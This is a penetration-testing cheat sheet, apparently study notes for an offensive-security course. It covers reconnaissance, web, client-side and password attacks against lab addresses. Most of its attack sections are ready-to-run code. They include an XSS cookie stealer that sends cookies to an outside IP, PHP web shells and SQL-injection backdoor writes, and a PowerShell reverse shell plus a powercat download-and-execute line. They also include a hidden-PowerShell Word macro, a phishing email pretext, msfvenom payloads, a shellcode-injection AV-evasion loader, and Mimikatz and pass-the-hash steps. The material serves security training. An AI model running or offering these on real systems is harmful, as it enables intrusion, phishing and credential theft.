# Information Gathering

## Whois Enumeration

* -h \<WHOIS server>

```bash
whois megacorpone.com -h 192.168.50.251
whois 38.100.193.70 -h 192.168.50.251
```

## DNS Enumeration

* **NS**: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
* **A**: Host record contains the IPv4 address of a hostname.
* **AAAA**: Quad A host record contains the IPv6 address of a hostname.
* **MX**: Mail Exchange records contain the names of the servers responsible for handling email for the domainv. A domain can contain multiple MX records.
* **PTR**: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
* **CNAME**: Canonical Name Records are used to create aliases for other host records.
* **TXT**: Text records can contain any arbitrary data and be used for various purposes, e.g. domain ownership verification.

```bash
host -t mx megacorpone.com
```

```bash
for sub in $(cat list.txt); do host $sub.megacorpone.com; done
```

```bash
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
```

Zone transfers

```bash
host -l megacorpone.com ns1.megacorpone.com
```

`./dns-axfr.sh megacorpone.com`

```bash
#!/bin/bash

if [ -z "$1" ]; then
  echo "[*] Simple Zone transfer script"
  echo "[*] Usage   : $0 <domain name> "
  exit 0
fi

# Identify the DNS servers for the domain

for server in $(host -t ns $1 | cut -d " " -f4); do
  # For each of these servers, attempt a zone transfer
  host -l $1 $server | grep "has address"
done
```

Windows **nslookup**

```bat
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```


* -t \<type of enumeration>
    * std: standard scan
    * brt: brute force
    * axfr: zone transfer

* -D \<filename containing potential subdomain strings>

Automate DNS enumeration

```bash
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
dnsrecon -d megacorpone.com -t axfr
```

```bash
dnsenum megacorpone.com
```

## TCP/UDP Port Scannning

* -w \<connection timeout in seconds>
* -z: zero-I/O mode, used for scanning and sends no data.
* -u: UDP scan

```bash
nc -nv -u -z -w 1 192.168.50.149 120-123
```

Sweep for hosts with an open port 445

```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

`portscan.sh`

```bash
#!/bin/bash

host=10.5.5.11
for port in {1..65535}; do
    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
        echo "port $port is open"
done
echo "Done"
```

Ping sweep on Windows

```bat
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
```

Checks if an IP responds to ICMP and whether a specified TCP port is open

```pwsh
Test-NetConnection -Port 445 192.168.50.151
```

Scan the first 1024 ports

```pwsh
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
```

## Port Scanning with Nmap

```bash
nmap --script-help http-headers
nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
```

* -sn: network sweep

```bash
nmap -sn 192.168.50.1-253
```

* -sS: TCP SYN scan
* -sU: UDP scan

```bash
sudo nmap -sU -sS 192.168.50.149
```

* -sT: connect scan (default), used when scanning via certain types of proxies
* -A: enable OS version detection, script scanning, and traceroute

```bash
nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt
```

* -O: OS fingerprinting

```bash
sudo nmap -O 192.168.50.14 --osscan-guess
```

```bash
nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
```

### Masscan

```bash
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tun0 --router-ip 10.11.0.1
```

## SMB Enumeration

```bash
nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
```

Query the NetBIOS name service for valid NetBIOS names

```bash
nbtscan -r 192.168.50.0/24
```

List all the shares running on dc01

```bat
net view \\dc01 /all
```

List available shares

```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Password1234
```

```bash
crackmapexec smb 192.168.50.242 -u john -d beyond.com -p "password" --shares
```

Mount SMB share on linux

```bash
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty09! /mnt/win10_share
```

## NFS Enumeration

Network File System allows a user on a client computer to access files over a computer network as if they were on locally-mounted storage.

Both Portmapper and RPCbind run on TCP port 111. RPCbind maps RPC services to the ports on which they listen.

The client system then contacts rpcbind on the server with a particular RPC **program number**. The rpcbind service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.

Find services that may have registered with rpcbind

```bash
nmap -v -p 111 10.11.1.1-254
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
nmap -p 111 --script nfs* 10.11.1.72
```

```bash
sudo mount -o nolock 10.11.1.72:/home ~/home/
```

Add a local user, change its UUID to e.g., 1014

```bash
sudo adduser pwn
sudo sed -i -e 's/1001/1014/g' /etc/passwd
su pwn
```

## SMTP Enumeration

```pwsh
Test-NetConnection -Port 25 192.168.50
```

Interact with the SMTP service

```bat
telnet 192.168.50.8 25
```

**VRFY** request asks the server to verify an email address
**EXPN** asks the server for the membership of a mailing list

`nc -nv 192.168.50.8 25`

```
VRFY root
VRFY idontexist
```

`python3 smtp.py root 192.168.50.8`

```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[2]

connect = s.connect((ip,25))
banner = s.recv(1024)
print(banner)

user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

s.close()
```

## SNMP Enumeration

```bash
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

**onesixtyone**

```bash
echo public > community.txt
echo private >> community.txt
echo manager >> community.txt
```

Brute force attack against a list of IP addresses

```bash
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips

onesixtyone -c community.txt -i ips
```

**snmpwalk**

Enumerates the entire MIB tree using:
* -c \<community string>
* -v \<SNMP version number>
* -t \<timeout period>

```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
```

Parse a specific branch of the MIB Tree called **OID**

```bash
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```

| **MIB values** | **Description** |
| -------------- | --------------- |
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |


# Vulnerability Scanning with Nmap

```bash
cat /usr/share/nmap/scripts/script.db | grep '"vuln"\|"exploit"'
```

```bash
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

# Web Application Attacks

## Web Application Enumeration

```bash
nmap -p80 -sV 192.168.50.20
```

```bash
whatweb http://192.168.50.244
```

```bash
gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
```

* -z 10: add a 10 millisecond delay to each request

```bash
dirb http://www.megacorpone.com -r -z 10
```

```bash
nikto -host=http://www.megacorpone.com -maxtime=30s
```

* --enumerate: include "All Plugins" (ap), "All Themes" (at), "Config backups" (cb), and "Db exports" (dbe)

```bash
wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

wpscan --url sandbox.local --enumerate ap,at,cb,dbe
```

## Enumerating and Abusing APIs

`pattern.txt`

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```

```bash
curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0.eyJl.OeZH' -d '{"password": "pwned"}'
```

## XSS

```html
<iframe src=http://10.11.0.4/report height="0" width="0"></iframe>
```

Cookie stealer

```html
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

**User-Agent** HTTP header: `<script>alert(42)</script>`

**AJAX**

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

To minify attack code into a one-liner: **JS Compress**

Encode the minified JavaScript code => any bad characters won't interfere

```js
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript('<insert_minified_javascript>')
console.log(encoded)
```

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded JS code>))</script>" --proxy 127.0.0.1:8080
```

## Directory Traversal

File that is readable by all local users:
- On Linux: `/etc/passwd`
- On Windows: `C:\Windows\System32\drivers\etc\hosts`

`http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts`

IIS web server => log paths and web root structure.
* `C:\inetpub\logs\LogFiles\W3SVC1\`
* `C:\inetpub\wwwroot\web.config` may contain sensitive information like passwords or usernames.

```bash
curl http://mountain.com/index.php?page=../../home/offsec/.ssh/id_rsa
```

### Apache 2.4.49 LFI

```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/etc/passwd
```

## File Inclusion Vulnerabilities

XAMPP's Apache logs: `C:\xampp\apache\logs\`

### LFI

```bash
curl http://mountaindesserts.com/index.php?page=../../var/log/apache2/access.log
```

### PHP Wrappers

Display the contents of files (with or without encodings like Base64)

```bash
curl http://mountaindesserts.com/index.php?page=php://filter/resource=admin.php

curl http://mountaindesserts.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Embed data elements as plaintext or base64-encoded data in the running web app's code

```bash
curl "http://mountaindesserts.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64

curl "http://mountaindesserts.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### RFI

`simple-backdoor.php`

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

```bash
curl "http://mountaindesserts.com/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```

## File Upload Vulnerabilities

Combine with another vulnerability, e.g., Directory Traversal, XXE or XSS:
- Overwrite files like **authorized_keys** using a relative path (`../../root/.ssh/authorized_keys`) in the file upload request.

- Embed an **XXE** attack to display file contents or even execute code when **upload an avatar** to a profile with an **SVG** file type.

Bypass filters that only check for the most common file extensions, change the file extension to **.phps** or **.php7**, **.pHP**.

Use PowerShell to encode the reverse shell one-liner

```pwsh
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
```

```bash
curl http://192.168.50.189/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<$EncodedText>
```

## Command Injection Vulnerabilities

Determine if our commands are executed by PowerShell or CMD

```pwsh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## SQL Injection Attacks

Vunerable SQL query:
`$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";`

### Authentication bypass

Enter in the *Username* field  

```
offsec' OR 1=1 -- //
```

```
tom' or 1=1 LIMIT 1;#
```

### Error-based payloads

```
' or 1=1 in (select @@version) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

Vunerable SQL query:`$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";`

Submit the following injected query into the search bar

Order the results by a specific column => number of columns

```
' ORDER BY 1-- //
```

### UNION-based payloads

```
' UNION SELECT null, null, database(), user(), @@version -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables

http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### Blind SQL Injections

`http://192.168.50.16/blindsqli.php?user=`

```
offsec' AND 1=1 -- //
offsec' AND IF (1=1, sleep(3),'false') -- //
```

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### sqlmap

```bash
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump

sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T --flush-session
```

### MySQL

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306

mysql --host=127.0.0.1 --port=13306 --user=wp -p
```

```
select version();
select system_user();
show databases;
SHOW Grants;
show variables;
```

### SQL Server

- When using a **SQL Server** command line tool like **sqlcmd**, submit our SQL statement ending with a **semicolon** followed by **GO** on a separate line.

- When running the command remotely, omit the **GO** statement since it's not part of the **MSSQL TDS protocol**.

```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

```
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

Enable **xp_cmdshell** function

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
```

### PostgreSQL

```bash
psql -h 192.168.50.63 -p 2345 -U postgres
```

```
postgres=# \l
postgres=# \c confluence
confluence=# select * from cwd_user;
```

# Client-side Attacks

- Malicious **JScript** code executed through the **Windows Script Host**.

- **.lnk** shortcut files pointing to malicious resources.

- Microsoft Office documents with embedded malicious **macros** written in VBA, which is a scripting language with full access to **ActiveX objects** and the Windows Script Host, similar to JavaScript in HTML Applications.

- An **HTML Application (HTA)** attached to an email to execute code in the context of Internet Explorer and to some extent, Microsoft Edge.

- Older client-side attack vectors like **Dynamic Data Exchange (DDE)** and various **Object Linking and Embedding (OLE)** methods do not work well today without significant target system modification.

## Target Reconnaissance

**Canarytokens** is a free web service that generates a link with an embedded token that we'll send to the target.

When the target opens the link in a browser => get information about their **browser, IP address, and OS**

Use an online IP logger like **Grabify or JavaScript fingerprinting libraries** such as **fingerprint.js**

```bash
exiftool -a -u brochure.pdf
```

## Leveraging Microsoft Word Macros

Split the base64-encoded string into smaller chunks of 50 characters and concatenate them into the **Str** variable

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```VB
Sub AutoOpen()
 MyMacro
End Sub

Sub Document_Open()
 MyMacro
End Sub

Sub MyMacro()
 Dim Str As String
 Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
...
 Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbAB=="
 CreateObject("Wscript.Shell").Run Str
End Sub
```

## Obtaining Code Execution via Windows Library Files

A **Windows library file** connecting to a **WebDAV** share

 1. The victim receives a `.Library-ms` file, perhaps via email. When they double-click the file, it will appear as a regular directory in **Windows Explorer**.

 2. In the WebDAV directory, provide a `.lnk` shortcut file to execute a PowerShell reverse shell. The user must double-click our `.lnk` payload file.

```bash
pip3 install wsgidav
mkdir /home/kali/webdav

/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

The **location of the item** input field of the `automatic_configuration.lnk` shortcut file

```bat
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```

`config.Library-ms`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

## Email Pretexting and Sending

`body.txt`

```
Hey!

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

```bash
swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

## HTML Application

Create a payload for an HTA attack

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
```

```html
<html>
  <head>
    <script>
      var c= 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ.....'
      new ActiveXObject('WScript.Shell').Run(c);
    </script>
  </head>
  <body>
    <script>
      self.close();
    </script>
  </body>
</html>
```

## Object Linking and Embedding

`launch.bat`

```bat
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

Include the above script in a Microsoft Word document:
- Navigate to the **Insert** ribbon > Click the **Object** menu > Choose the **Create from File** tab > Select our batch script, `launch.bat`.
- Check the **Display as icon** check box and choose **Change Icon** to pick a different icon for it and enter a caption, which is what the victim will see, rather than the actual file name.

Like Microsoft Word, Microsoft Publisher allows embedded objects and ultimately code execution, but will not enable **Protected View** for Internet-delivered documents.

# Public Exploits

The **Browser Exploitation Framework (BeEF)** tool focuses on client-side attacks executed within a web browser.

Browse to `http://127.0.0.1:3000/ui/panel` using the default credentials `beef/beef` to log in

```bash
beef-xss
```

## Locating Public Exploits

```bash
searchsploit remote smb microsoft windows
searchsploit "Sync Breeze Enterprise 10.0.28"

searchsploit -x 50420

searchsploit -m 42031
searchsploit -m windows/remote/48537.py
```

```bash
grep Exploits /usr/share/nmap/scripts/*.nse
nmap --script-help=clamav-exec.nse
```

## Fixing Exploits

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Modify the return address

```C
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

### Cross-Compiling Exploit Code

* -lws2_32: find the **winsock** library

```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

```bash
wine syncbreeze_exploit.exe
```

# Antivirus Evasion

VirusTotal, `AntiScan.Me`

* -b: dump file's binary representation

```bash
xxd -b malware.txt
```

-p flag outputs a plain hexdump

```bash
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
```

## On-disk evasion

- Packers, obfuscators, crypter
- Anti-reversing, anti-debugging, virtual machine emulation detection.
- Software protectors like anti-copy
- The Enigma Protector

## In-Memory evation**

- **Remote Process Memory Injection** attempts to inject the payload into another valid PE that is not malicious by leveraging a set of Windows API.

 1. Use the **OpenProcess** function to obtain a valid **HANDLE** to a target process that we have permission to access.

 2. Allocate memory in the context of that process by calling a Windows API such as **VirtualAllocEx**.

 3. Copy the malicious payload to the newly allocated memory using **WriteProcessMemory**.

 4. Rxecute the payload in memory in a separate thread using the **CreateRemoteThread** API.

- **Regular DLL injection** involves loading a malicious DLL from disk using the **LoadLibrary** API.

- **Reflective DLL Injection** technique attempts to load a DLL stored by the attacker in the process memory. The main challenge is that **LoadLibrary** does not support loading a DLL from memory. Attackers must write their own version of the API that does not rely on a disk-based DLL.

- **Process Hollowing**

1. Launch a non-malicious process in a suspended state.

2. The image of the process is removed from memory and replaced with a malicious executable image.

3. The process is then resumed and malicious code is executed instead of the legitimate process.

- **Inline hooking** involves modifying memory and introducing a hook (an instruction that redirects the code execution) into a function to make it point to our malicious code. Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed. Hooking is a technique often employed by **rootkits**.

Rootkits aim to provide persistent access to the target system through modification of system components in user space, kernel, or even at lower OS protection rings such as boot or hypervisor. Rootkits need administrative privileges to implant its hooks.

## Evading AV with Thread Injection

Shellcode for `bypass.ps1` script

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

Remote process memory injection technique: target the currently executing process (the x86 PowerShell interpreter)

`bypass.ps1`

```pwsh
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

## Automate AV evasion payloads

**Shellter**, a dynamic shellcode injection tool, backdoor a valid and non-malicious executable file with a malicious shellcode payload. Shellter attempts to use the existing PE **Import Address Table** (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.

```bash
sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32

sudo apt install shellter
```

Generate custom (C) payload with msfvenom for shellter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin
```

# Password Attacks

## Attacking Network Services Logins

```bash
hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V

hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Attempt to gain access to an htaccess-protected folder, `/admin`

```bash
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

Remote Desktop Protocol Attack with Crowbar

```bash
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```

## Password Cracking

Hash type identification

```bash
hashid c43ee559d69bc7f691fe2fbfe8a5ef0a
```

### Mutating Wordlists

```bash
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```

Delete all lines starting with a "1"

```bash
sed -i '/^1/d' demo.txt
```

Generate a custom wordlist:

- Set the minimum and maximum length to 6 characters
- Specify the pattern using the `-t` parameter
- Specify path to the character set file (`-f`)

* @:	Lower case alpha characters
* ,:	Upper case alpha characters
* %:	Numeric characters
* ^:	Special characters including space

The mixed alpha set **mixalpha** includes all lower and upper case letters.

```bash
crunch 6 6 -t Lab%%% > wordlist
crunch 4 6 0123456789ABCDEF -o crunch.txt
crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
```

#### Rule file for Hashcat

* $: append a character
* ^: prepend a character

`demo.rule`

```
$1
c
$1 c $!
```

Display the mutated passwords

```bash
hashcat -r demo.rule --stdout demo.txt

john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
```

### Crack MD5

```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo.rule --force
```

### Password Manager

```pwsh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
keepass2john Database.kdbx > keepass.hash

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### Crack Linux-based hashes with JTR

Combine the passwd and shadow files from the compromised system

```bash
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
```

```bash
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### SSH Private Key Passphrase

```bash
ssh2john id_rsa > ssh.hash
```

#### Rule file for John the Ripper

`ssh.rule`

```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

Append the contents of our rule file into `/etc/john/john.conf`

```bash
sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

`ssh.passwords` is a wordlist file containing the passwords.

```bash
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 dave@192.168.50.201
```

## Working with Password Hashes

### Cracking NTLM

Mimikatz includes the **sekurlsa** module, which extracts password hashes from the Local Security Authority Subsystem (LSASS) process memory.

**LSASS** is a process that handles user authentication, password changes, and access token creation. LSASS caches NTLM hashes and other credentials. LSASS runs under the **SYSTEM** user.

=> We can only extract passwords if we are running Mimikatz as Administrator (or higher) and have the **SeDebugPrivilege** access right enabled.

Elevate our privileges to the SYSTEM account with tools like **PsExec** or the built-in Mimikatz **token elevation function**.

The token elevation function requires the **SeImpersonatePrivilege** access right to work, but all local administrators have it by default.

```bat
mimikatz.exe
```

* `privilege::debug`: have the **SeDebugPrivilege** access right enabled
* `token::elevate`: elevate to **SYSTEM** user privileges.
* `lsadump::sam`: extract the NTLM hashes from the SAM.

```
privilege::debug
token::elevate
lsadump::sam
```

```bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```

### Passing NTLM

- For **SMB enumeration and management**, use **smbclient** or **CrackMapExec**.

- Use **NTLM hashes** to connect to target systems with **SMB**, and via other protocols like **RDP** and **WinRM**.

Connect to the SMB share **secrets**

```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

Since Windows Vista, all Windows versions have **UAC remote restrictions** enabled by default. This prevents software or commands from running with administrative rights on remote systems. This effectively mitigates this attack vector for users in the **local administrator group** aside from the **local Administrator account**.

If we don't use the local **Administrator** user in **pass-the-hash**, the target machine also needs to be configured in a certain way to obtain successful **code execution**.

- For **command execution**, use the scripts from the **impacket** library like `psexec.py` and `wmiexec.py`.

- `psexec.py` script from the **impacket** library is very similar to the original **Sysinternals PsExec** command. It searches for a writable share and uploads an executable file to it. Then it registers the executable as a Windows service and starts it.

Obtain a shell as the **SYSTEM** user

```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Obtain a shell as the **Administrator** user

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### Cracking Net-NTLMv2

**Net-NTLMv2** network authentication protocol is responsible for managing the authentication process for Windows clients and servers over a network.

To gain access to an SMB share on a Windows server from a Windows client via Net-NTLMv2:

1. Send the server a request, outlining the connection details.

2. The server will send us a challenge in which we **encrypt** data for our response with our **NTLM hash** to prove our identity.

3. The server will then check our challenge response and either grant or deny access, accordingly.

Net-NTLMv2 is less secure than the more modern **Kerberos** protocol. In the real-world, the majority of Windows environments still rely on the older protocol, to support older devices that may not support Kerberos.

We need our target to start an authentication process using Net-NTLMv2 against a system we control.

The **Responder** tool includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes. It also includes other protocol servers (including HTTP and FTP) as well as Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS) poisoning capabilities.

```bash
sudo responder -I tap0
```

